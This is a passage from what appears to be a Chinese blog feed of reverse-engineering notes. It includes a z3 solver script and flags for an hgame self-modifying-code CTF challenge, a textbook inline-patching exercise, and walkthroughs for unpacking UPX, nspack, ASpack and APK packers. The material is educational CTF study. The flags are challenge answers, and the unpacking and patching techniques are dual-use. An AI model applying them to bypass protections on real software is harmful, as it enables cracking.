-26 * a1[0]+ 42 * a1[30] + 22 * a1[25] + -89 * a1[19] + v24 + 41 * a1[35] + 68 * a1[8] == -41387)s.add(v25 == -53 * a1[8]      + -18 * a1[1]      + 9 * a1[32]      + -45 * a1[9]      + -97 * a1[12]      + -19 * a1[19]      + -87 * a1[3]      + 89 * a1[27]      + 54 * a1[5]      + 59 * a1[22]      + 95 * a1[17]      + 62 * a1[26]      + 6 * a1[20]      + (a1[14] *64)      + -50 * a1[13]      + -95 * a1[30]      + -68 * a1[16]      + 10 * a1[0]      - a1[2]      - a1[28]      + 17 * a1[18]      - 76 * a1[6]      - 24 * a1[23]      - 76 * a1[11]      + 33 * a1[34]      - 98 * a1[31]      - 60 * a1[29]      - 74 * a1[35]      + 31 * a1[7]      + 50 * a1[24]      + 25 * a1[21]      - 83 * a1[33])s.add(-59 * a1[10] + 35 * a1[4] + v25 + 25 * a1[25] + 52 * a1[15] == -30463)s.add(v26 == -42 * a1[35]      + 30 * a1[28]      + -54 * a1[30]      + -53 * a1[20]      + 98 * a1[33]      + 70 * a1[32]      + 99 * a1[19]      + -27 * a1[25]      + 84 * a1[34]      + -73 * a1[14]      + -54 * a1[7]      + -45 * a1[26]      + -97 * a1[18]      + 40 * a1[10]      + 73 * a1[27]      + -55 * a1[11]      + 52 * a1[29]      + -29 * a1[13]      + 32 * a1[24]      + -80 * a1[0]      + -79 * a1[17]      + -39 * a1[6]      + 88 * a1[1]      + 44 * a1[2]      - 50 * a1[3]      - 2 * a1[22]      - 44 * a1[31]      - 62 * a1[8]      - 51 * a1[4]      + 12 * a1[16]      - 55 * a1[9])s.add(-68 * a1[5] + 77 * a1[21] + -34 * a1[15] + v26 + 40 * a1[12] + 76 * a1[23] == -14435)s.add(v27 == 74 * a1[30]      + 16 * a1[16]      + -83 * a1[33]      + 16 * a1[2]      + -17 * a1[17]      + -28 * a1[8]      + 9 * a1[7]      + 86 * a1[20]      + 70 * a1[13]      + -76 * a1[19]      + -31 * a1[28]      + 77 * a1[14]      + 48 * a1[15]      + -78 * a1[31]      + -82 * a1[26]      + 69 * a1[3]      + 70 * a1[5]      + 95 * a1[6]      - 60 * a1[4]      + 30 * a1[27]      + 3 * a1[29]      - 29 * a1[32]      + 5 * a1[24]      + 55 * a1[0]      + 36 * a1[23]      - 90 * a1[22]      + 37 * a1[35]      + 78 * a1[34]      - 62 * a1[10]      + 46 * a1[9]      + 63 * a1[21]      - 39 * a1[12])s.add(20 * a1[11] + -64 * a1[1] + v27 - (a1[18] *64) - 27 * a1[25] == 23472)s.add(v28 == -55 * a1[3]      + 85 * a1[16]      + -97 * a1[34]      + -29 * a1[27]      + -79 * a1[32]      + 50 * a1[28]      + 7 * a1[0]      + 92 * a1[6]      + -57 * a1[24]      + -89 * a1[11]      + -47 * a1[5]      + -39 * a1[30]      + (a1[8] *64)      + -63 * a1[12]      + -46 * a1[9]      + -82 * a1[17]      + 39 * a1[23]      + 58 * a1[13]      - 81 * a1[1]      + 33 * a1[29]      + 89 * a1[7]      - 14 * a1[20]      + 97 * a1[33]      + 10 * a1[35]      - 46 * a1[14]      + 81 * a1[4]      + 89 * a1[15]      + 81 * a1[22]      - 44 * a1[31]      - 60 * a1[10]      - 20 * a1[26]      + 18 * a1[18])s.add( 97 * a1[21] + -71 * a1[2] + -7 * a1[19] + v28 + 91 * a1[25] == 7913)s.add( v29 == -22 * a1[15]      + -79 * a1[12]      + -18 * a1[2]      + 23 * a1[20]      + -20 * a1[14]      + (a1[19] *64)      + 91 * a1[5]      + 49 * a1[17]      + 52 * a1[18]      + -89 * a1[25]      + -93 * a1[35]      + -70 * a1[11]      + -45 * a1[24]      + 88 * a1[30]      + 92 * a1[31]      + 44 * a1[26]      + -5 * a1[1]      + -48 * a1[6]      + -16 * a1[22]      + 88 * a1[32]      + 91 * a1[33]      + 82 * a1[28]      + 98 * a1[8]      - 63 * a1[13]      - 8 * a1[9]      - a1[16]      - 4 * a1[27]      - 47 * a1[4]      - 6 * a1[7]      + 84 * a1[3]      - 6 * a1[34]      + 69 * a1[21])s.add(-41 * a1[10] + 67 * a1[29] + v29 - 4 * a1[23] - 80 * a1[0] == 23824 )s.add(  v30 == -28 * a1[35]      + -72 * a1[6]      + -46 * a1[32]      + 99 * a1[20]      + -69 * a1[22]      + -94 * a1[12]      + -35 * a1[8]      + -29 * a1[0]      + 89 * a1[11]      + 61 * a1[7]      + -92 * a1[31]      + 99 * a1[21]      + 27 * a1[16]      + -48 * a1[24]      + -51 * a1[4]      + -39 * a1[25]      + 84 * a1[30]      + 34 * a1[14]      + -73 * a1[17]      + -92 * a1[18]      + 72 * a1[2]      - 14 * a1[13]      - a1[19]      + 2 * a1[9]      + 3 * a1[29]      - 61 * a1[33]      - 6 * a1[26]      - 57 * a1[15]      - 8 * a1[27]      - 29 * a1[10]      - 2 * a1[23]      - 23 * a1[34])s.add(v30 + 41 * a1[3] + 42 * a1[28] == -13865)s.add(v31 == 74 * a1[12]            + 22 * a1[29]            + -29 * a1[20]            + -49 * a1[22]            + 88 * a1[14]            + -51 * a1[24]            + 44 * a1[21]            + 28 * a1[13]            + 62 * a1[25]            + 85 * a1[8]            + -66 * a1[32]            + 43 * a1[10]            + 32 * a1[33]            + 75 * a1[34]            + 44 * a1[1]            + 49 * a1[28]            + -21 * a1[26]            + 60 * a1[4]            + -40 * a1[0]            + -98 * a1[15]            + -37 * a1[9]            + 78 * a1[16]            + 96 * a1[35]            - 84 * a1[18]            - 2 * a1[7]            + 43 * a1[2]            - 28 * a1[6]            - 77 * a1[3]            - 30 * a1[17]            - 95 * a1[5]            + 5 * a1[23]            + 85 * a1[31])s.add(90 * a1[19] + 58 * a1[30] + v31 + 5 * a1[27] + 47 * a1[11] == 50179)s.add(v32 == -92 * a1[26]            + 4 * a1[29]            + -89 * a1[20]            + 57 * a1[15]            + -66 * a1[0]            + -85 * a1[12]            + 91 * a1[35]            + -68 * a1[2]            + -100 * a1[25]            + -88 * a1[18]            + 46 * a1[33]            + 50 * a1[31]            + -85 * a1[4]            + -92 * a1[6]            + -54 * a1[7]            + 83 * a1[23]            + -25 * a1[24]            + -91 * a1[5]            + 85 * a1[10]            + -15 * a1[16]            - 59 * a1[27]            - 91 * a1[8]            + 73 * a1[32]            + 44 * a1[19]            + 5 * a1[34]            + 68 * a1[14]            - 32 * a1[21]            - 26 * a1[30]            - 56 * a1[17]            - 95 * a1[3]            - 16 * a1[13]            - 76 * a1[11])s.add( 30 * a1[1] + v32 - 48 * a1[9] - 88 * a1[22] + 65 * a1[28] == -75429)s.add(v33 == 4 * a1[17]            + -49 * a1[20]            + -71 * a1[13]            + -23 * a1[23]            + -19 * a1[21]            + 62 * a1[2]            + -41 * a1[19]            + 46 * a1[15]            + 5 * a1[1]            + -2 * a1[5]            + 88 * a1[9]            + 84 * a1[16]            + 77 * a1[6]            - 6 * a1[26]            + 51 * a1[33]            - 96 * a1[31]            + 59 * a1[14]            - 62 * a1[8]            - 55 * a1[25]            - 32 * a1[34]            + 69 * a1[32]            - 48 * a1[28]            - 21 * a1[27]            + 31 * a1[0]            - 98 * a1[10])s.add(85 * a1[30]      + -35 * a1[24]      + -58 * a1[18]      + 16 * a1[12]      + -45 * a1[7]      + 49 * a1[35]      + 8 * a1[11]      + 54 * a1[22]      + -33 * a1[4]      + v33      - 96 * a1[29]      - 71 * a1[3] == -18764)s.add(v34 == -78 * a1[32]            + -88 * a1[11]            + -21 * a1[35]            + 25 * a1[18]            + -81 * a1[19]            + 74 * a1[20]            + -50 * a1[2]            + -46 * a1[21]            + 28 * a1[15]            + -100 * a1[5]            + 53 * a1[28]            + -93 * a1[9]            + -69 * a1[1]            + -61 * a1[0]            + 26 * a1[8]            + -66 * a1[6]            + -66 * a1[27]            - 42 * a1[4]            + 89 * a1[33]            - 30 * a1[31]            - 45 * a1[22]            + 13 * a1[14]            - 29 * a1[3]            + 33 * a1[10]            + 54 * a1[23]            + 18 * a1[30]            - 39 * a1[29]            + 15 * a1[13]            + 83 * a1[26])s.add( 88 * a1[12] + 84 * a1[34] + 66 * a1[24] + 99 * a1[16] + v34 - 28 * a1[7] + 2 * a1[25] == -20428)s.add(v35 == 10 * a1[31]            + (a1[28] *64)            + 97 * a1[5]            + -7 * a1[27]            + 62 * a1[14]            + 60 * a1[24]            + 27 * a1[34]            + -11 * a1[10]            + -97 * a1[22]            + 14 * a1[33]            + -43 * a1[11]            + 40 * a1[20]            + 31 * a1[13]            + 44 * a1[29]            + -68 * a1[3]            + -36 * a1[1]            + -38 * a1[9]            + -7 * a1[12]            + a1[26]            + -50 * a1[6]            + 59 * a1[8]            + 88 * a1[30]            + 46 * a1[0]            - 34 * a1[15]            + 10 * a1[4]            + 84 * a1[18]            + 13 * a1[7]            + 14 * a1[25]            - 5 * a1[16]            - 31 * a1[32]            - 48 * a1[19]            - 55 * a1[35])s.add(v35 - 96 * a1[2] - 83 * a1[23] == 11973)s.add(v36 == 6 * a1[22]            + 58 * a1[34]            + 4 * a1[31]            + 55 * a1[21]            + -99 * a1[4]            + -57 * a1[8]            + 2 * a1[7]            + 57 * a1[24]            + -54 * a1[25]            + 39 * a1[29]            + -91 * a1[1]            + -32 * a1[20]            + -30 * a1[11]            + 16 * a1[12]            + 45 * a1[17]            + 90 * a1[32]            + 26 * a1[5]            - 59 * a1[28]            + 7 * a1[2]            - 88 * a1[3]            + 36 * a1[15]            - 73 * a1[6]            - 6 * a1[27]            + 99 * a1[13]            - 96 * a1[0]            - 72 * a1[16]            + 27 * a1[19]            + 79 * a1[23]            - 28 * a1[18]            - 90 * a1[30])s.add( -45 * a1[26] + -10 * a1[35] + -40 * a1[9] + 97 * a1[10] + v36 - 6 * a1[33] + 58 * a1[14] == -23186)s.check()print(s.model())</code></pre><p>解出来整理一下是hgame{@_FAKE_flag!-do_Y0u_know_SMC?}</p><p>根据提示去找一些函数，看看是否有smc，发现在这个函数里面。<br><img src="https://i.loli.net/2021/02/27/51qzJTVpPNEcHOv.png"><br>然后写idapython脚本，还原，话说攻防世界也有一道smc的题，好像叫BABYRE，当时还不懂。</p><pre><code>import sysfrom idautils import *from idc import *import idaapiif __name__ ==&quot;__main__&quot;:    start_addr=0x401216    end_addr=0x409080    for i in range(0x43e):        PatchByte(start_addr+i,Byte(start_addr+i)^Byte(end_addr+i))</code></pre><p>然后PatchByte好像只能在IDA7.0才能用，所以可以先在IDA7.0用了然后保存文件，就可以看到真正的代码了。<br>和这个文章差不多<a href="https://blog.csdn.net/s1054436218/article/details/78651075">https://blog.csdn.net/s1054436218/article/details/78651075</a>和矩阵有点关系。<br><img src="https://i.loli.net/2021/02/27/3HyC64RQ7xflGqI.png"><br>大致过程就是，将输入的flag，和假的flag分成6*6的矩阵</p><pre><code>然后flag的第一行分别和假flag的每一列的对应数字相乘，每相乘一列就得到一个数，第一行会得到6个数然后flag的第二行分别和假flag的每一列的对应数字相乘，每相乘一列就得到一个数，第二行会得到6个数然后flag的第三行分别和假flag的每一列的对应数字相乘，每相乘一列就得到一个数，第三行会得到6个数然后flag的第四行分别和假flag的每一列的对应数字相乘，每相乘一列就得到一个数，第四行会得到6个数然后flag的第五行分别和假flag的每一列的对应数字相乘，每相乘一列就得到一个数，第五行会得到6个数然后flag的第六行分别和假flag的每一列的对应数字相乘，每相乘一列就得到一个数，第六行会得到6个数</code></pre><p>最后就得到了v39的36个数。</p><p>然后用z3约束写脚本</p><pre><code>from z3 import *s = Solver()v38=[55030,61095,60151,57247,56780,55726,     46642,52931,53580,50437,50062,44186,     44909,46490,46024,44347,43850,44368,     54990,61884,61202,58139,57730,54964,     48849,51026,49629,48219,47904,50823,     46596,50517,48421,46143,46102,46744]v37=[104,103,97,109,101,123,     64,95,70,65,75,69,     95,102,108,97,103,33,     45,100,111,95,89,48,     117,95,107,111,110,119,     95,83,77,67,63,125]print(len(v37))print(len(v38))s = Solver()flag=[0]*36v39=[0 for i in range(36)]for i in range(36):    flag[i] = Int(&#39;flag[&#39;+str(i)+&#39;]&#39;)for i in range(6):    s.add(flag[i] == ord(&#39;hgame&#123;&#39;[i]))s.add(flag[-1] == ord(&#39;&#125;&#39;))for i in range(6,36):    s.add(flag[i]&gt;=32)    s.add(flag[i]&lt;=127)for i in range(6):#行    for j in range(6):#列        for k in range(6):            v39[6 * i + j] = v39[6 * i + j] + v37[6 * k + j] * flag[6 * i + k]        s.add(simplify(v39[j + 6 * i] == v38[j + 6 * i]))print(s.check())m=s.model()print(m)</code></pre><p>得到hgame{E@sy_Se1f-Modifying_C0oodee33}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆向工程核心原理》20章内嵌补丁练习</title>
      <link href="2021/02/26/%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E7%BB%83%E4%B9%A0/"/>
      <url>2021/02/26/%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="内嵌补丁练习"><a href="#内嵌补丁练习" class="headerlink" title="内嵌补丁练习"></a>内嵌补丁练习</h2><p>参考资料：《逆向工程核心原理》20章。</p><p>样本：找了很久，网上基本没人发到网上，发了的都是要钱的(难受)，只不过还是在吾爱破解注册了个号下载下来了(花了19块，QAQ)。所以这里给一个我的百度网盘连接给所有爱学习的人<a href="https://pan.baidu.com/s/1GlrUwfRX1aMBDLr54B1iLQ">https://pan.baidu.com/s/1GlrUwfRX1aMBDLr54B1iLQ</a>  提取码yeah</p><p>目的：通过内嵌补丁来修改样本中的两个字符串。</p><h3 id="什么叫内嵌补丁"><a href="#什么叫内嵌补丁" class="headerlink" title="什么叫内嵌补丁"></a>什么叫内嵌补丁</h3><p>先给一张图<br><img src="https://i.loli.net/2021/02/26/Yt5gWo2NZzrqaUe.png"><br>大概意思就是，有些时候我们不能直接改代码，可能是因为代码被加密了，或者有其他一些检查，于是我们就需要通过插入补丁代码，让程序运行同时，也运行我们的补丁，然后这个补丁就可以来修改代码(这个样本就是通过修改解密后的代码达到修改字符串的目的)。</p><h3 id="分析样本"><a href="#分析样本" class="headerlink" title="分析样本"></a>分析样本</h3><p>先打开文件，会跳出这两个窗口，我们就是要改变这两个窗口的字符串<br><img src="https://i.loli.net/2021/02/26/tCN7Xo1PnBVKw5W.png"></p><p>然后放入x32dbg分析，先f9来到EP处<br><img src="https://i.loli.net/2021/02/26/CG8naysID2frWAx.png"><br>然后跟进call unpackmecrc.4010E9这个函数，进去后再跟进call unpackmecrc.40109B这个函数，也就来到了解密函数。<br><img src="https://i.loli.net/2021/02/26/p1uBh2t5Y7bPQUc.png"><br>可以先看看经过两次解密后004010F5–00401249大概是什么内容，可以看到窗口出现的字符串。<br><img src="https://i.loli.net/2021/02/26/qPHLjARwr8DJeoa.png"></p><p>然后继续跟，来到call unpackmecrc.401039这个函数，这个函数是已经被解密了的。<br><img src="https://i.loli.net/2021/02/26/B3GjoIstRyHd2aw.png"></p><p>跟进去看会发现是一个Crc效检。<br><img src="https://i.loli.net/2021/02/26/bSHmyCiIqfNkFOT.png">-<br>然后先看看解密出来的0040124A–401280<br><img src="https://i.loli.net/2021/02/26/aER6zYeMKsoW3bc.png"><br>来到OEP处，有一个关键的函数<br><img src="https://i.loli.net/2021/02/26/59GfwHnYLkQBTmR.png"><br>先来看看这个函数DialogBoxParamA()</p><pre><code>INT_PTR DialogBoxParamA(  HINSTANCE hInstance,  LPCSTR    lpTemplateName,  HWND      hWndParent,  DLGPROC   lpDialogFunc,对话框过程的指点。有关对话框程序的更多信息，请参阅对话程序。  LPARAM    dwInitParam);</code></pre><p>详细到这个网站去看<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dialogboxparama">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dialogboxparama</a></p><p>然后就先进入第4个参数地址处内部去看看，原来004010F5–00401249是被加密过的，现在已经解密了。<br><img src="https://i.loli.net/2021/02/26/U3mEONFRgsbwSrz.png"><br>分析到这里就差不多了，开始打补丁。</p><h3 id="打补丁"><a href="#打补丁" class="headerlink" title="打补丁"></a>打补丁</h3><p><strong>1.先说一下补丁打在哪。</strong><br>①设置到文件的空白区域。</p><p>②扩展最后节区后设置。</p><p>③添加新节区后设置。</p><p>③和②的方法适合添加代码较多的适合运用。</p><p>这个文件就特地的设置了一个1000的空白区域，在地址00401280处，学过PE就可以很容易知道这部分内容了。</p><p><strong>2.打补丁的大致思路</strong></p><p>先修改最后到OEP的jmp指令，修改使其跳转到我们的补丁处，然后执行我们的补丁，然后补丁的最后再写一个jmp指令跳到OEP处。</p><p><strong>3.正式写补丁</strong></p><p>直接抄的书上的，因为不会写汇编，但是书上也比较易懂，直接用Ctrl+e来编辑<br><img src="https://i.loli.net/2021/02/26/DmFptSvs1UCdEAh.png"><br>然后还有一件事，就是将原来跳到OEP的指令改为跳到我们的补丁地址处，这里涉及到jmp指令的原理，《汇编语言》一书中有讲原理，并且我们修改的是被解密的部分，所以在还要加密回去。</p><p>通过上述分析样本过程我们可以知道<br><img src="https://i.loli.net/2021/02/26/eJSID8HLwAMuGNg.png"><br>图片中的xor 7是因为这部分地址的加密过程就是用的xor 7，可以看样本分析过程中的相应部分，对照地址来查看，还有个注意的地方就是这个必须在调试的最之前来改这个部分(具体来说是未解密之前)。</p><h3 id="正式运行打补丁后的程序"><a href="#正式运行打补丁后的程序" class="headerlink" title="正式运行打补丁后的程序"></a>正式运行打补丁后的程序</h3><p><img src="https://i.loli.net/2021/02/26/JeihdTzUCYNl1VH.png"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆原》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些常用的壳</title>
      <link href="2021/02/04/%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%A3%B3/"/>
      <url>2021/02/04/%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="一些常用的壳"><a href="#一些常用的壳" class="headerlink" title="一些常用的壳"></a>一些常用的壳</h1><p><strong>前言</strong>：最近做到了一道题，然后因找不到工具来脱壳，然后就学了手动脱壳。关于手动脱壳的一些知识点吧，而且这还是syc三面的一个任务，当时做的懵懵懂懂的。主要就在于找到OEP,然后dump，然后修复ITA表，然后也看了一些资料。</p><p>查找的资料：《逆向工程核心原理》第二部分，esp定理(感觉就像堆栈平衡差不多)。</p><p>参考文章：<a href="https://www.cnblogs.com/hongren/p/12633232.html">https://www.cnblogs.com/hongren/p/12633232.html</a>，<a href="https://blog.csdn.net/qq_42967398/article/details/94761189">https://blog.csdn.net/qq_42967398/article/details/94761189</a>然后两篇文章主要不同点还是在dump程序和，修复ITA的工具不同吧。个人推荐xdbg自带的那个，因为方便。</p><h2 id="nspack"><a href="#nspack" class="headerlink" title="nspack"></a>nspack</h2><p>又称北斗壳，话不多说直接开始。样本是xctf高阶的crackme，然后是快速找OEP。</p><p>载入后按f9，然后两下f8。<br><img src="https://i.loli.net/2021/02/04/WCvN5jDJ8weViH2.png"><br>然后f9，就可以看到popfd<br><img src="https://i.loli.net/2021/02/04/wSqmVXLt9pvogx3.png"><br>然后找到了OEP<br><img src="https://i.loli.net/2021/02/04/LKVBTxmWsjfaEtq.png"><br>现在开始修复ITA。<br><img src="https://i.loli.net/2021/02/04/tFfY7mhPXUzValM.png"><br>到这里，壳就脱完了。</p><h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h2><p>以xctf-Windows_Reverse1为例，是upx壳。</p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>这里先用快速查找OEP的方法。</p><p>同样，先下硬件断点<br><img src="https://i.loli.net/2021/02/04/8vO41DwrqoyluSs.png"><br>然后f9<br><img src="https://i.loli.net/2021/02/04/x6OLHlu1WdIEgvn.png"><br>就可以看到OEP了。<br><img src="https://i.loli.net/2021/02/04/EuCNTFjqUpMr24y.png"><br>接下来dump，然后修复ITA就行了。</p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>一步步跟踪来找到OEP，这是以前照着《逆向工程核心原理》过程直接写的，那时候很多东西不懂，应该有很多错误。</p><h4 id="一些概念："><a href="#一些概念：" class="headerlink" title="一些概念："></a>一些概念：</h4><p>1.无损压缩（lossless compression:原文件的每一个数据在解压缩后仍然还在。所有的信息都完全恢复。这一般是那些丢失数据可能会发生问题的文本或表格文件选用的技术。</p><p>2.有损压缩（lossy compression）：通过永久删除包含的信息尤其是冗余信息减少文件。在当文件解压缩的时候，只有一部份原始信息仍然存在 。有损压缩一般用于录影和声音，多数用户感觉不出来一定量的信息损失。</p><p>3.IAT:<a href="https://blog.csdn.net/king_cpp_py/article/details/79539052">https://blog.csdn.net/king_cpp_py/article/details/79539052</a></p><p>《逆向工程核心原理》书上14章和15章和《加密与解密》588,589,590,626,637~641。都讲述了一些关于upx加密的内容</p><h4 id="书上内容的总结："><a href="#书上内容的总结：" class="headerlink" title="书上内容的总结："></a>书上内容的总结：</h4><p>1.外壳loader大致分为两个部分<br><img src="https://i.loli.net/2020/11/17/nNCwftH1rvMEWDg.jpg" alt="QQ图片20201117002513.jpg"></p><p><img src="https://i.loli.net/2020/11/17/tRVMcLU5CsTxdFO.jpg"><br>2.壳的第一部分和第二部分应该都在第一张图片中00000400节区(upx1),这个节区内部含有解压缩代码和压缩的源代码，其中的解压缩代码应该就是指的是第二张图片中壳的第一部分(是以非压缩的方式存在的)，而压缩的源代码应该就指的是壳的第二部分。</p><p>3.壳的第一部分中的代码的作用是将外壳的第二部分放在内存中解压缩和初始化一些数据，解压缩后的代码会被解压到第一张图中00000400节区(upx0)处，这个节区开始文件大小为0，但他的虚拟地址大小有10000。解压缩这个过程会调用aPLib 0.22b压缩引擎，并且解压后的代码是加了密的，还需要解密，书上用了一个方法进行解密（看不懂）。最后，得到了解压后的壳的第二部分。</p><p>4.然后就是壳的第二部分，这一部分的功能就是，还原程序并初始化IAT。</p><p>5.具体过程为，首先要了解外壳的数据结构，区块的数据，输入表，入口点等。(这些数据在内存中偏移量是一定的)，脱壳机就是从偏移量来确定外壳的数据结构。然后还会恢复复源代码E8E9(call和jmp指令)，通过loop循环指令来实现。如果是加壳实现压缩的话，就会修复E8E9，这样有利于提高压缩率，其原因是因为外壳现在是用相对基址来改写指令(我理解为相对基址的路程应该会短一些，所以快一些，书上写的是提高了机器码的重复率)。</p><p>6.现在已经得到解压和恢复之后的原始数据，之后还需要判断是否需要重定位，如果要重定位，外壳就会进行重定位，如果不要，就直接取得重定位表的地址，然后外壳模拟windows加载器来填充IAT。</p><p>大概过程应该就是这样，应该会有很多错误，因为我是菜鸡，而且应该也只懂了很小一部分。</p><h4 id="二、将syc-2-exe进行解壳并查看"><a href="#二、将syc-2-exe进行解壳并查看" class="headerlink" title="二、将syc-2.exe进行解壳并查看"></a>二、将syc-2.exe进行解壳并查看</h4><p>1.开始下载Quick Unpack进行解壳，失败。又下载upxshell进行解壳，说需要更低版本的upx，可我明明就没得upx，失败。最后下载upx，下载官网（<a href="https://upx.github.io/">https://upx.github.io/</a>）。</p><p>开始使用upx，第一次使用</p><pre><code>D:\&gt;cd D:\learning software\UPX\upx308w\upx.exe目录名称无效。</code></pre><p>错误，目录名称无效，搞了很久，经过不断承认我是傻逼，终于，将upx.exe直接放到D盘下。</p><pre><code>D:\&gt;upx                       Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2011UPX 3.08w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Dec 12th 2011Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file..Commands:  -1     compress faster                   -9    compress better  -d     decompress                        -l    list compressed file  -t     test compressed file              -V    display version number  -h     give more help                    -L    display software licenseOptions:  -q     be quiet                          -v    be verbose  -oFILE write output to &#39;FILE&#39;  -f     force compression of suspicious files  -k     keep backup filesfile..   executables to (de)compressType &#39;upx --help&#39; for more detailed help.UPX comes with ABSOLUTELY NO WARRANTY; for details visit http://upx.sf.net</code></pre><p>然后查找upx怎么脱壳，<a href="https://blog.csdn.net/weixin_33913332/article/details/94060335">https://blog.csdn.net/weixin_33913332/article/details/94060335</a>，开始脱壳</p><pre><code>D:\&gt;upx -d syc-2.exe                       Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2011UPX 3.08w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Dec 12th 2011        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------     21504 &lt;-     13312   61.90%    win32/pe     syc-2.exeUnpacked 1 file.</code></pre><p>可以看到syc-2.exe由原来的13kb变成了20kb</p><p>2.解壳后的syc-2.exe文件放到IDA里面看</p><p>然后发现一些英文</p><pre><code>A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the  appropriate bitmask.  For example :char c = (i &amp; 0xFF) Changing the code in this way will not affect the quality of the resulting optimized code.</code></pre><p>翻译出来</p><pre><code>转换为较小的数据类型会导致数据丢失。如果这是有意的，您应该使用适当的位掩码来屏蔽强制转换的源。例如：char c=（i&amp;0xFF）以这种方式更改代码不会影响结果优化代码的质量。</code></pre><h4 id="三、开始尝试照着《逆向核心原理》的15章调试syc-2-exe"><a href="#三、开始尝试照着《逆向核心原理》的15章调试syc-2-exe" class="headerlink" title="三、开始尝试照着《逆向核心原理》的15章调试syc-2.exe"></a>三、开始尝试照着《逆向核心原理》的15章调试syc-2.exe</h4><p>先看看这个upx加壳后的exe的pe文件结构。<br><img src="https://i.loli.net/2020/11/17/MdaVOTsNoSfAi79.png"><br>跟踪代码原则：遇到loop循环是，先了解作用再跳出。</p><p>1.先来看开头部分<br>    <img src="https://i.loli.net/2020/11/17/xuZjzJwyUHDbais.png"><br>EP地址为00B6B870，是第二个节区upx1的尾部，被压缩的源代码在上面。</p><p>2.到了第一个和书上一样的循环<br><img src="https://i.loli.net/2020/11/17/nQqFJ6X51AYcvHm.png"><br>循环次数为0A，意思是将EDXB61005中读取一个字节到EDI00B1006,跳出循环。</p><p>3.一个大循环<br><img src="https://i.loli.net/2020/11/17/GcPQpl56yxtAYnI.png"><br>此循环是从00B6B88E到00B6B93D，是解压缩循环，会从第二个节区(UPX1)依次读值然后解压缩，又把解压缩后的值放到第一个节区(UPX0)。在00B6B942设置一个断点，跳出循环。</p><p>4.又一个循环<br><img src="https://i.loli.net/2020/11/17/AP5IzjKoLDg48YT.png"><br>用来恢复源代码E8E9(CALL和JMP)指令的desination地址。在00B6B976设置断点，跳出循环。</p><p>5.设置IAT的循环<br><img src="https://i.loli.net/2020/11/17/iLlGnbPKmQvospW.png"><br>在00B6B976处的EDI=00161871，来指向节区二(UPX1)区域,来获得原exe文件调用API函数的字符串，从而调用00B6B9A7地址的GerProcAddress()函数。<br><img src="https://i.loli.net/2020/11/17/EjpsCiZD7Su49ef.png"><br>获取API起始地址，再把此地址输入到原exe的IAT区域。继续跑起来，要跑很久的时间，最后到达原syc-2.exe程序的OEP处。</p><p>6.原syc-2.exe程序的OEP。</p><p>在这下个断点，此处为跳转到OEP的代码。<br><img src="https://i.loli.net/2020/11/17/nz6BpTfrGlPxZeN.png"><br>继续执行，到达OEP<br><img src="https://i.loli.net/2020/11/17/fSFgNA9q745dxUe.png"></p><h3 id="ASpack"><a href="#ASpack" class="headerlink" title="ASpack"></a>ASpack</h3><p>xctf-Windows_Reverse2，这个文件是ASpack的壳，快速寻找OEP的步骤和其他的差不多。以后有需要在来探讨其解压过程。</p><h3 id="Upack"><a href="#Upack" class="headerlink" title="Upack"></a>Upack</h3><p>这个壳好像和upx壳有点不一样，看了《逆向工程核心原理》后再来整理。还没遇到这种壳的题目，没找到样本。</p><h3 id="apk腾讯壳"><a href="#apk腾讯壳" class="headerlink" title="apk腾讯壳"></a>apk腾讯壳</h3><p>样本：neepu的flag管理系统</p><p>工具准备：模拟器，我用的雷电，还有FDex2。</p><p>先打开FDex2，点击目标apk<br><img src="https://i.loli.net/2021/05/24/LrpltUTG7yifeKm.png"><br>然后再次打开目标apk，脱壳后的dex就在输出目录下了，我们要做的就是将这个dex传到电脑上</p><p>命令<br><img src="https://i.loli.net/2021/05/24/4IFsyJoxMr1kjAh.png"><br>这样就得到了脱完壳后的dex。</p><h3 id="apk360加固"><a href="#apk360加固" class="headerlink" title="apk360加固"></a>apk360加固</h3><p><a href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a><br>说是可以一键脱壳，但是上面的腾讯壳没脱成功。不知道行不行。</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆原》 </tag>
            
            <tag> 壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf的wp</title>
      <link href="2021/01/21/xctf%E7%9A%84wp/"/>
      <url>2021/01/21/xctf%E7%9A%84wp/</url>
      
